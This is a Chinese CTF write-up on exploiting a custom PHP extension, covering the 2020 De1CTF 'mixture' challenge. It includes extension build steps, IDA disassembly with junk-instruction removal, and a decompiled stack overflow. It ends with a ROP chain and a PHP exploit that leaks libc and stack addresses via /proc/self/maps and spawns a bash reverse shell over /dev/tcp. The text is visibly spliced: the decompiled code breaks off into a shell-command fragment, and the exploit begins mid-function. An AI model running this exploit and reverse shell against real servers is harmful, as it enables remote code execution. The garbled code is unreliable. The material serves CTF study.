    }
其中 `PHP_FUNCTION`修饰的函数表示该函数可以直接在php中进行调用。而
`zend_parse_parameters`函数是获取用户输入的参数。arg代表参数字符，arg_len代表参数长度。
然后，需要在 `zend_function_entry phppwn_functions` 中对该函数进行注册：
    const zend_function_entry phppwn_functions[] = {
        PHP_FE(confirm_phppwn_compiled,    NULL)        /* For testing, remove later. */
        PHP_FE(phppwn, NULL)
        PHP_FE_END    /* Must be the last line in phppwn_functions[] */
    };
随后，即可使用如下命令配置编译：
    /usr/bin/phpize
    ./configure --with-php-config=/usr/bin/php-config
随后，可以使用 make指令编译生成拓展模块。新生成的拓展模块会被放在同目录下 `./modules`中。也可以直接使用 `make
install`命令。然后将新生成的拓展模块放置到 本地 `php`所在的拓展库路径下。可以使用如下命令，查找本地php拓展库路径：
    php -i | grep extensions
然后，在`php.ini`文件里添加自行编写的拓展库名称即可，直接在文件末尾添加如下代码：
    extensions=phppwn.so
自此，我们即可在 php中直接调用之前在拓展模块中注册的 phppwn()函数。  
 **调试技巧**  
一般使用 IDA查看拓展库 `.so`文件，需要重点关注由拓展库自己注册的函数，名字一般由 zif开头。我们需要重点关注此类函数即可。
如果使用gdb调试，可以直接调试本地环境的 `php`程序，使用如下命令：
    gdb php
随后，`r`运行，ctrl+b中断，然后即可对拓展库下函数名断点。
> 下面以2到例题，讲解webpwn的做题思路。
## 2020De1CTF-mixture
###  环境搭建
这里原题目是需要通过结合了一系列web漏洞，最后才能拿到
`php`的拓展模块。此处对前面`web`漏洞不做分析，重点分析后续的`php`漏洞利用。所以，直接用题目所给的 `.so`来搭建环境。
将`Minclude.so`放入本地 `php`拓展库路径下，随后在 `php.ini`配置文件中，添加如下代码：
    extensions=Minclude.so
随后创建如下文件，测试拓展模块是否加载成功：
执行命令，得到如下结果说明环境搭建成功。
    $php test.php | grep Minclude
    Minclude
    Minclude support => enabled
###  漏洞分析
这里 `Minclude.so`使用了花指令进行了混淆，可以看到无法对 zif_Minclude直接生成伪代码。这里需要先做一个去除花指令：
    .text:0000000000001220 zif_Minclude    proc near               ; DATA XREF: LOAD:0000000000000418↑o
    .text:0000000000001220                                         ; .data.rel.ro:Minclude_functions↓o
    .text:0000000000001220
    .text:0000000000001220 arg             = qword ptr -98h
    .text:0000000000001220 arg_len         = qword ptr -90h
    .text:0000000000001220 a               = byte ptr -88h
    .text:0000000000001220
    .text:0000000000001220 ; FUNCTION CHUNK AT .text:0000000000001236 SIZE 0000000F BYTES
    .text:0000000000001220
    .text:0000000000001220 execute_data = rdi                      ; zend_execute_data *
    .text:0000000000001220 return_value = rsi                      ; zval *
    .text:0000000000001220 ; __unwind {
    .text:0000000000001220                 push    r12
    .text:0000000000001222                 mov     r8, execute_data
    .text:0000000000001225                 mov     r12, return_value
    .text:0000000000001228                 push    rbp
    .text:0000000000001229                 push    rbx
    .text:000000000000122A                 add     rsp, 0FFFFFFFFFFFFFF80h
    .text:000000000000122E                 push    rax
    .text:000000000000122F                 xor     rax, rax
    .text:0000000000001232                 jz      short next1
    .text:0000000000001232 zif_Minclude    endp ; sp-analysis failed
    .text:0000000000001232
    .text:0000000000001232 ; ---------------------------------------------------------------------------    .text:0000000000001234                 db 0E9h, 0DEh
    .text:0000000000001236 ; ---------------------------------------------------------------------------    .text:0000000000001236 ; START OF FUNCTION CHUNK FOR zif_Minclude
    .text:0000000000001236
    .text:0000000000001236 next1:                                  ; CODE XREF: zif_Minclude+12↑j
    .text:0000000000001236                 pop     rax
    .text:0000000000001237                 mov     [rsp+98h+arg], 0
    .text:000000000000123F                 push    rax
    .text:0000000000001240                 call    l2
    .text:0000000000001240 ; END OF FUNCTION CHUNK FOR zif_Minclude
    .text:0000000000001240 ; ---------------------------------------------------------------------------    .text:0000000000001245                 db 0EAh
    .text:0000000000001246
    .text:0000000000001246 ; =============== S U B R O U T I N E =======================================
    .text:0000000000001246
    .text:0000000000001246
    .text:0000000000001246 l2              proc near               ; CODE XREF: zif_Minclude+20↑p
    .text:0000000000001246                 pop     rax
    .text:0000000000001247                 add     rax, 8
    .text:000000000000124B                 push    rax
    .text:000000000000124C                 retn
    .text:000000000000124C l2              endp
    .text:000000000000124C
这里 0x122e 到 0x124d为无效指令，可以直接对其
nop掉，具体原理方法，可参考[这篇文章](https://aluvion.gitee.io/2020/06/29/%E9%80%86%E5%90%91%E8%8A%B1%E6%8C%87%E4%BB%A4%E5%85%A5%E9%97%A8/)。  
然后，即可正常生成反汇编代码：
    void __fastcall zif_Minclude(zend_execute_data *execute_data, zval *return_value)
    {
      zval *v2; // r12
      unsigned __int64 v3; // rsi
      FILE *v4; // rbx
      __int64 v5; // rax
      void *src; // [rsp+0h] [rbp-98h]
      size_t n; // [rsp+8h] [rbp-90h]
      char dest; // [rsp+10h] [rbp-88h]
      int v9; // [rsp+70h] [rbp-28h]
      char *v10; // [rsp+74h] [rbp-24h]
      v2 = return_value;
      memset(&dest, 0, 0x60uLL);
      v9 = 0;
      v10 = &dest;
      if ( (unsigned int)zend_parse_parameters(execute_data->This.u2.next, "s", &src, &n) != -1 )
      {
        memcpy(&dest, src, n);
        php_printf("%s", &dest);
        php_printf("", &dest);
        v3 = (unsigned __int64)"rb";
        v4 = fopen(&dest, "rb");
        if ( v4 )
        {
          while ( !feof(v4) )
          {
            v3 = (unsigned int)fgetc(v4);
            php_printf("%c", v3);
          }
          php_printf("\n", v3);
        }
        else
        {
          php_printf("no file\n", "rb");
        }
        v5 = zend_strpprintf(0LL, "True");
        v2->value.lval = v5;
        v2->u1.type_info = (*(_BYTE *)(v5 + 5) & 2u) &/dev/tcp/127.0.0.1/666 0>&1"','r')
那么，我们总体的ROP结构如下：
    ROP = flat([
        p_rdi_r, command_addr,
        p_rsi_r, r_addr,
        popen_addr,
        r_flag,
        command
    ])
最终的EXP如下所示：
    >= 8;
        }
        return $re;
    }
    function callback($buffer){
        global $libc,$stack;
        $p1 = '/([0-9a-f]+)\-[0-9a-f]+ .* \/lib\/x86_64-linux-gnu\/libc-2.27.so/';
        $p = '/([0-9a-f]+)\-[0-9a-f]+ .*  \[stack\]/';
        preg_match_all($p, $buffer, $stack);
        preg_match_all($p1, $buffer, $libc);
        return "";
    }
    $command = '/bin/bash -c "/bin/bash -i >&/dev/tcp/127.0.0.1/6666 0>&1"';
    ob_start("callback");
    $a="/proc/self/maps";
    Minclude($a);
    $buffer=ob_get_contents();
    ob_end_flush();